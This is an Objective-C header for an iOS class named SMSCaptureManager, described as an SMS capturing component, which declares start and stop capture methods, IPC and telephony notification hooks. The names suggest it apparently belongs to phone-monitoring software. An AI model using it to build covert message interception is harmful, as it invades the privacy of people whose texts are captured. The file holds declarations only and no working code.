/**
 - Project name :  SMSCapture Maanager 
 - Class name   :  SMSCaptureManager
 - Version      :  1.0  
 - Purpose      :  For SMS Capturing Component
 - Copy right   :  28/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/


#import <Foundation/Foundation.h>
#import "EventDelegate.h"
#import "MessagePortIPCReader.h"
#import "AppContext.h"

@class SMSNotifier;
@class SMSCaptureUtils;

@protocol TelephonyNotificationManager;

@interface SMSCaptureManager : NSObject <MessagePortIPCDelegate> {
@private
	//For creatinn an instance of SocketIPCReader
    MessagePortIPCReader	*mMessagePortIPCReader; 
	id <EventDelegate>      mEventDelegate;
	id <AppContext>			mAppContext;
	SMSCaptureUtils				*mSMSUtils;
	
	// IOS 6
	SMSNotifier			*mSMSNotifier;
	id <TelephonyNotificationManager>	mTelephonyNotificationManager;
	NSMutableArray		*mSMSEventPool;
}

@property (nonatomic, assign) id <AppContext> mAppContext;
@property (nonatomic, assign) id <TelephonyNotificationManager> mTelephonyNotificationManager;

- (id) initWithEventDelegate:(id <EventDelegate>) aEventDelegate;
- (void) startCapture;
- (void) stopCapture;

@end
